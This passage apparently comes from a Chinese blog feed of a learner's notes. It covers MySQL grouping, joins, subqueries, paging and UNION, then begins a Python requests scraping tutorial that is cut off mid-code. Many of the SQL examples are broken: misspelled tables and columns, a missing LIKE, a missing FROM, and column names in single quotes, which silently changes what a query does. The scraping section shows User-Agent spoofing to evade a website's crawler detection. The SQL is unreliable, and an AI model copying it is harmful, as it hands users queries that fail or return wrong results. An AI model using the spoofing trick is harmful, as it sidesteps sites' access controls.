将日期转换成字符</li></ol><ul><li>更多日期函数请上网搜索</li></ul><h6 id="四、流程控制函数"><a href="#四、流程控制函数" class="headerlink" title="四、流程控制函数"></a>四、流程控制函数</h6><ol><li>if( ) :该函数起到的作用类似与python或C语言中的else if( )函数</li><li>case( )： </li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">case 要判断的字段或表达式    // 选择函数——判断并选择显示一个</span><br><span class="line">when 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 </span><br><span class="line">when 常量2 then 要显示的值2或语句2;</span><br><span class="line">...</span><br><span class="line">else 默认显示的值或语句</span><br><span class="line">end</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">case</span><br><span class="line">when 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 </span><br><span class="line">when 常量2 then 要显示的值2或语句2;</span><br><span class="line">...</span><br><span class="line">else 默认显示的值或语句</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h6 id="五、其它函数"><a href="#五、其它函数" class="headerlink" title="五、其它函数"></a>五、其它函数</h6><ul><li>其他函数太多，用时上网搜</li></ul><h5 id="分组函数"><a href="#分组函数" class="headerlink" title="分组函数"></a>分组函数</h5><ul><li>功能：用作统计使用，又称为聚合函数或统计函数或组函数</li><li>分类：sum 求和， avg 平均值， max， min， count 计算个数</li><li>忽略 NULL值</li><li>可以与distinct( )去重函数或其它函数搭配使用</li><li>count( )详细介绍</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from 表单;  //统计总行数</span><br></pre></td></tr></table></figure><ul><li>和分组函数一同查询的字段要求是group by后的字段</li></ul><h4 id="4、分组查询"><a href="#4、分组查询" class="headerlink" title="4、分组查询"></a>4、分组查询</h4><ol><li>语法：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select 分组函数，列（要求出现在group by的后面）</span><br><span class="line">from 表</span><br><span class="line">[where 筛选条件]</span><br><span class="line">group by 分组的列表;</span><br><span class="line">[order by 子句]</span><br><span class="line"></span><br><span class="line">// 查询列表必须特殊，要求是分组函数和group by 后出现的字段</span><br></pre></td></tr></table></figure><ul><li>简单的分组查询</li></ul><ol><li>实例一：查询每个工种的最高工资</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select max(salary), job_id</span><br><span class="line">from employees</span><br><span class="line">group by job_id;</span><br></pre></td></tr></table></figure><ol start="3"><li>实例二：查询每个位置上的部门个数</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select count(*), location_id</span><br><span class="line">from departments</span><br><span class="line">group by lacation_id;</span><br></pre></td></tr></table></figure><ul><li>添加筛选条件的分组查询</li></ul><ol start="4"><li>实例三：查询邮箱中包含a字符的，每个部门的平均工资</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select avg(salsry), department_id</span><br><span class="line">from employees</span><br><span class="line">where email &#x27;%a%&#x27;</span><br><span class="line">group by department_id;</span><br></pre></td></tr></table></figure><ol start="5"><li>实例四：查询有奖金的每个领导手下员工的最高工资</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select max(salary), manager_id</span><br><span class="line">from employees</span><br><span class="line">where commission_pct is ont null</span><br><span class="line">group by manager_id;</span><br></pre></td></tr></table></figure><ul><li>添加复杂筛选条件的分组查询</li><li>分组后进行条件筛选的查询</li></ul><ol start="6"><li>实例五：查询哪个部门的员工个数&gt;2</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select count(*), depatment_id</span><br><span class="line">from employees</span><br><span class="line">group by department_id</span><br><span class="line">having count(*)&gt;2;   //用查询的结果再进行筛选时用having</span><br></pre></td></tr></table></figure><h4 id="5、连接查询【-优先学习99语法-】"><a href="#5、连接查询【-优先学习99语法-】" class="headerlink" title="5、连接查询【 优先学习99语法 】"></a>5、连接查询【 优先学习99语法 】</h4><ol><li><p>含义：又称多表查询，当查询的字段来自于多个表时，就会用到连接查询</p></li><li><p>笛卡尔乘积现象：表1有m行，表2有n行，结果有m×n行</p><ol><li>发生原因：没有有效的链接条件</li><li>如何避免：添加有效的连接条件</li></ol></li><li><p>按功能分类：</p><ul><li><p>内连接：等值连接</p><p>​               非等值连接</p><p>​               自连接</p></li><li><p>外连接：左外连接</p><p>​               右外连接</p><p>​               全外连接</p></li><li><p>交叉连接</p></li></ul></li></ol><h5 id="SQL92语法"><a href="#SQL92语法" class="headerlink" title="SQL92语法"></a>SQL92语法</h5><p>(1) 等值查询</p><ul><li>查询员工名和对应的部门名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select last_name, department_name</span><br><span class="line">from employees, departments</span><br><span class="line">where employees.&#x27;department_id=departments.&#x27;department_id&#x27;;</span><br></pre></td></tr></table></figure><ul><li>多条件筛选连接查询<ul><li>查询有奖金的员工名，部门名</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select last_name, department_name, commission_pct</span><br><span class="line">from emplloees e, departments d</span><br><span class="line">where e.&#x27;department_id&#x27;=d.&#x27;department_id&#x27;</span><br><span class="line">and e.&#x27;commission_pct&#x27; is not null;</span><br></pre></td></tr></table></figure><p>(2) 非等值链接</p><ul><li>在等值链接的基础上将条件改为非等值就行</li></ul><p>(3) 自链接</p><ul><li><p>自己链接自己</p></li><li><p>实例:查询查询一张表中员工名和上级的名称</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select e.employee_id, e.last_name, m.employee_id, m.last_name</span><br><span class="line">from employees e, employees m</span><br><span class="line">where e.&#x27;manager_id&#x27;=m.&#x27;employee_id&#x27;;</span><br></pre></td></tr></table></figure><h5 id="SQL99语法"><a href="#SQL99语法" class="headerlink" title="SQL99语法"></a>SQL99语法</h5><ul><li><p>语法： select 查询列表</p><p>​            from 表1 别名</p><pre><code>        [连接类型]  join 表2 别名</code></pre><p>​            on 连接条件</p><p>​            where 筛选条件</p><p>​            group by 分组</p><p>​            having 筛选条件</p><p>​            order by 排序条件</p></li></ul><h6 id="内链接"><a href="#内链接" class="headerlink" title="内链接"></a>内链接</h6><ul><li>语法：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 查询列表</span><br><span class="line">from 表1 别名</span><br><span class="line">inner join 表2 别名</span><br><span class="line">on 连接条件；</span><br></pre></td></tr></table></figure><ul><li>分类：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">内链接：inner</span><br><span class="line">外链接</span><br><span class="line">左外：left【outer】  //括号中outer可以省去</span><br><span class="line">右外：right 【outer】</span><br><span class="line">全外：full 【outer</span><br><span class="line">交叉连接：cross</span><br></pre></td></tr></table></figure><ol><li>等值查询（内连接）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">案例1 查询员工名、部门名</span><br><span class="line">select last_name, department_name</span><br><span class="line">from employees e</span><br><span class="line">inner join departments d</span><br><span class="line">on e.&#x27;department_id&#x27; = d.&#x27;department_id&#x27;;</span><br></pre></td></tr></table></figure><ol start="2"><li>非等值连接(内链接)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">案例1：查询员工的工资级别</span><br><span class="line">select salary, grdae_level</span><br><span class="line">from employees e</span><br><span class="line">join job_grades g</span><br><span class="line">on e.&#x27;salary&#x27; between g.&#x27;lowest_sal&#x27; and &#x27;highest_sal&#x27;;</span><br></pre></td></tr></table></figure><ol start="3"><li>自连接（内连接）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查询员工的名字，上级的名字,包含字符k的</span><br><span class="line">select e.last_name, m.last_name</span><br><span class="line">join employees m</span><br><span class="line">on e.&#x27;manager_id&#x27; = m.&#x27;employee_id&#x27;</span><br><span class="line">where e.&#x27;last_name&#x27; like &#x27;%k%&#x27;;</span><br></pre></td></tr></table></figure><h6 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h6><ul><li>应用场景，一个表格有，一个表格没有</li><li>特点：</li></ul><ol><li><p>外连接的查询结果为主表中的所有记录</p><p>如果从表中有和他匹配的，则显示匹配值</p><p>如果从表中没有和它匹配的值，则显示null</p><p>外连接查询结果=内链接结果+主表中有而从表中没有的记录</p></li><li><p>左外连接，left join左边的是主表</p><p>右外连接，right join右边的是主表</p><p>左外右外和俩个表都换一下顺序，可以实现同样的效果</p></li></ol><ul><li><p>主表：查询内容较多的表格</p></li><li><p>全外连接：全外连接=内连接的结果+表1中有但表2中没有的+表2中有但表1中没有的</p></li></ul><h6 id="交叉连接"><a href="#交叉连接" class="headerlink" title="交叉连接"></a>交叉连接</h6><ul><li>相当于用99语法实现的笛卡尔乘积</li></ul><p>图示：</p><p><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/06/25/NBjOQf.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="NBjOQf.png"></p><p><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/06/25/NBjXy8.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="NBjXy8.png"></p><h4 id="6、子查询"><a href="#6、子查询" class="headerlink" title="6、子查询"></a>6、子查询</h4><ol><li>含义：出现在其他语句中的select语句，称为子查询或内查询</li><li>分类：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">按子查询出现的位置：</span><br><span class="line">select后面：</span><br><span class="line">仅仅支持标量子查询</span><br><span class="line">from后面：</span><br><span class="line">支持表子查询</span><br><span class="line">where或having后面： // 重点</span><br><span class="line">标量子查询   //  重点</span><br><span class="line">列子查询// 重点</span><br><span class="line">行子查询// 重点</span><br><span class="line">exists后面（相关子查询）</span><br><span class="line">表子查询</span><br><span class="line">按结果集的行列数不同：</span><br><span class="line">标量子查询：结果集只有一行一列</span><br><span class="line">列子查询：结果集有一列多行</span><br><span class="line">行子查询：结果集有一行多列</span><br><span class="line">表子查询：结果集有多行多列</span><br></pre></td></tr></table></figure><ul><li>（一）where或having后面</li></ul><ol><li><p>标量子查询（单行子查询）</p></li><li><p>列子查询（多行子查询）</p></li><li><p>行子查询（多行多列）</p></li><li><p>特点：（1）子查询放在小括号内</p><p>​           （2）子查询一般放在条件的右侧</p><p>​            （3）标量子查询，一般搭配着单行操作符使用&lt;  &gt; =   &gt;=  &lt;=等</p><p>​                     列子查询，一般搭配多行操作符使用 in, any,some, all</p><p>​              (4)子查询的执行优先于主查询，因为主查询要用到子查询</p></li><li><p>标量子查询</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">案例：谁的工资比sam高？</span><br><span class="line">#查询sam的工资</span><br><span class="line">select salary</span><br><span class="line">from employees</span><br><span class="line">where last_name = &#x27;sam&#x27;；</span><br><span class="line"></span><br><span class="line">#查询员工的信息，满足salary &gt; sam工资 的结果</span><br><span class="line">select *</span><br><span class="line">from employees</span><br><span class="line">where salary &gt;(</span><br><span class="line">    select salary</span><br><span class="line">    from employees      //为更清晰的表达，子查询最好进行缩进</span><br><span class="line">    where last_name = &#x27;sam&#x27;  </span><br><span class="line">)；</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">案例：返回公司工资最少的员工的last_name,job_id,salary</span><br><span class="line">#查询公司的最低工资</span><br><span class="line">select min(salary)</span><br><span class="line">from empolyees;</span><br><span class="line"></span><br><span class="line">#查询last_name, job_id, salary, 要求salary= 公司的最低工资</span><br><span class="line">select last_name, job_id, salary</span><br><span class="line">from employees</span><br><span class="line">where salary=(</span><br><span class="line">    select min(salary)</span><br><span class="line">    from empolyees</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ol start="2"><li>列子查询(多行子查询）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">案例：返回location_id是1400或1700的部门中的所有员工姓名</span><br><span class="line">#查询location_id是1700或1400的部门编号</span><br><span class="line">select department_id</span><br><span class="line">from departments</span><br><span class="line">where location_id in(1400, 1700);</span><br><span class="line"></span><br><span class="line">#查询员工姓名，要求部门号是上个查询结果中的某一个</span><br><span class="line">select employees</span><br><span class="line">where department_id in(</span><br><span class="line">    select department_id</span><br><span class="line">    from departments</span><br><span class="line">    where location_id in(1400, 1700)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ol start="3"><li><p>行子查询（多行多列）</p><p>略</p></li></ol><ul><li>（二）放在select后面的标量子查询</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">案例：查询每个部门的员工个数</span><br><span class="line">select d.*, (</span><br><span class="line">select count(*)</span><br><span class="line">from empolyees e</span><br><span class="line">where e.department_id = d.&#x27;department_id&#x27;</span><br><span class="line">) 个数</span><br><span class="line">from departments d;</span><br></pre></td></tr></table></figure><ul><li>（三）放在from后面<ul><li>将子查询结果当成一张表，要求必须起别名</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">案例：查询每个部门的平均工资的平均等级</span><br><span class="line">#查询每个部门的平均工资</span><br><span class="line">select avg(salary), department_id</span><br><span class="line">from employees</span><br><span class="line">group by department_id</span><br><span class="line"></span><br><span class="line">#连接上个查询结果集和job_grades表，筛选条件平均工资</span><br><span class="line">select ag_dep.*, g.&#x27;grade_level&#x27;</span><br><span class="line">from(</span><br><span class="line">select avg(salary), department_id</span><br><span class="line">from employees</span><br><span class="line">group by department_id</span><br><span class="line">) ag_dep</span><br><span class="line">inner join job_grades g</span><br><span class="line">on ag_dep.ag between lowest_sal and highest_sal;</span><br></pre></td></tr></table></figure><ul><li>（四）放在exists后面（相关子查询）<ul><li>能用exists的都能用in代替</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line">exists 完整的查询语句</span><br><span class="line">结果：0或1   //返回一个布尔值</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">案例：查询员工的部门名</span><br><span class="line">select department_name</span><br><span class="line">from departments d</span><br><span class="line">where exists(</span><br><span class="line">select *</span><br><span class="line">from employees e</span><br><span class="line">where d.&#x27;department_id&#x27;=e.&#x27;depaertment_id&#x27;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="7、分页查询"><a href="#7、分页查询" class="headerlink" title="7、分页查询"></a>7、分页查询</h4><ol><li>应用场景：当要显示的数据，一页显示不全，需要枫叶提交sql请求</li><li>语法：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select 查询列表</span><br><span class="line">from 表</span><br><span class="line">连接类型 join 表2</span><br><span class="line">on 连接条件</span><br><span class="line">where 筛选条件</span><br><span class="line">group by 分组字段</span><br><span class="line">having 分组后的筛选</span><br><span class="line">order by 排序的字段</span><br><span class="line">limit offset, size;</span><br><span class="line"></span><br><span class="line">offset要显示条目的起始索引（起始索引从0开始）</span><br><span class="line">size 要显示的条目个数</span><br></pre></td></tr></table></figure><ol start="3"><li>案例：查询前五条员工信息</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from employees limit 0, 5;</span><br></pre></td></tr></table></figure><ol start="4"><li>案例2：查询11条—第25条</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from employees limit 10, 15;</span><br></pre></td></tr></table></figure><ol start="5"><li>案例3：有奖金的员工信息，并且工资较高的前10名显示出来</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select *</span><br><span class="line">from employees</span><br><span class="line">where commission_pic is not null</span><br><span class="line">order by salsry desc</span><br><span class="line">limit 10;</span><br></pre></td></tr></table></figure><ol start="6"><li>特点：</li></ol><ul><li>limit语句放在查询语句德尔最后</li><li>公式：要显示的页数page，每页的条目数size</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select 查询列表</span><br><span class="line">from 表</span><br><span class="line">limit (page-1)*size, size;</span><br></pre></td></tr></table></figure><h4 id="8、联合查询"><a href="#8、联合查询" class="headerlink" title="8、联合查询"></a>8、联合查询</h4><ol><li>union联合 ：将多个查询语句的结果合并成一个结果</li><li>语法：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查询语句1</span><br><span class="line">union</span><br><span class="line">查询语句2</span><br><span class="line">union</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ol start="3"><li>案例：查询部门编号&gt;90或邮箱包含a的员工信息</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select *</span><br><span class="line">from employees</span><br><span class="line">where email like &#x27;%a%&#x27; or deaprtment_id&gt;90;</span><br><span class="line"></span><br><span class="line">select *</span><br><span class="line">from employees</span><br><span class="line">where email like &#x27;%a%&#x27;</span><br><span class="line">union</span><br><span class="line">select *</span><br><span class="line">from employees</span><br><span class="line">where deparment_id&gt;90;</span><br></pre></td></tr></table></figure><ol start="4"><li>特点：</li></ol><ul><li>要求多条查询语句的查询列数是一致的</li><li>要求多条查询语句的查询的每一列的类型和顺序最好一致</li><li>union关键字默认去重，如果使用union all 可以包含重复选项</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> sql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫技术</title>
      <link href="/2020/09/14/spider/"/>
      <url>/2020/09/14/spider/</url>
      
        <content type="html"><![CDATA[<h1 id="爬虫第一天"><a href="#爬虫第一天" class="headerlink" title="爬虫第一天"></a>爬虫第一天</h1><ul><li>urllib太过古老，因此不加以深入学习</li></ul><h3 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h3><p>requests模块：python中原生的一款基于网络请求的模块，功能强大，简单便捷，效率高。<br>作用：模拟浏览器发送请求。</p><p>如何使用：（requests模块的编码流程）<br>    -指定url<br>    -发起请求（get或post）<br>    -获取响应数据<br>    -持久化存储（数据库或本地存储）</p><p>环境安装：<br>    -pip或pycharm安装<br>    -anaconda自带（方便已装）</p><span id="more"></span><h3 id="实战编码："><a href="#实战编码：" class="headerlink" title="实战编码："></a><strong>实战编码：</strong></h3><pre><code>- 需求：爬取拉勾网首页的数据    示例：</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#step 1:指定url</span></span><br><span class="line">    url = <span class="string">&quot;https://www.lagou.com/jobs/6889986.html?show=96e52fa1d2134ad483eac5662bcc9fc6&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#step_2:发起请求</span></span><br><span class="line">    <span class="comment">#get会返回一个响应对象</span></span><br><span class="line">    response = requests.get(url=url)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#step_3:获取相应数据(.text返回的是字符串形式的响应数据)</span></span><br><span class="line">    page_text = response.text</span><br><span class="line">    <span class="built_in">print</span>(page_text)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#step_4:持久化存储</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./lagou.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding = <span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(page_text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;爬取数据结束&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><p>以上代码极有可能会被网站捕获，被识别出为爬虫，所以需要实施反爬虫策略</p></li><li><p>示例：<br>UA:User-Agent (请求载体的身份标识)<br>UA检测：门户网站的服务器会检测对应的载体身份标识，如果检测到请求的载体身份标识为某一款浏览器，<br>说明该请求是一个正常的请求。但是，如果监测到请求的载体身份标识不是基于某一款浏览器的，则表示<br>该请求为不正常的请求（爬虫），则服务器端就很有可能拒绝这次请求。<br>UA伪装:将对应的请求载体身份标识伪装成一款浏览器</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># UA伪装：将对应的User-Agent封装到一个字典中</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&#x27;https://www.sogou.com/web?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#处理url携带的参数：封装到字典中（参数为问号后面的）</span></span><br><span class="line">    kw = <span class="built_in">input</span>(<span class="string">&#x27;enter a word:&#x27;</span>)</span><br><span class="line">    param = &#123;</span><br><span class="line">        <span class="string">&#x27;query&#x27;</span>: kw</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 需求的响应返回的是一个对象，对象应实例化</span></span><br><span class="line">    response = requests.get(url=url, params=param, headers=headers)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 确认相应数据是txt类型的</span></span><br><span class="line">    page_text = response.text</span><br><span class="line">    fileName = kw+<span class="string">&#x27;.html&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(fileName, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(page_text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;保存成功。。。&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="爬虫第二天"><a href="#爬虫第二天" class="headerlink" title="爬虫第二天"></a>爬虫第二天</h1><h3 id="有关于ajax"><a href="#有关于ajax" class="headerlink" title="有关于ajax"></a>有关于ajax</h3><h4 id="爬取百度翻译的内容"><a href="#爬取百度翻译的内容" class="headerlink" title="爬取百度翻译的内容"></a>爬取百度翻译的内容</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 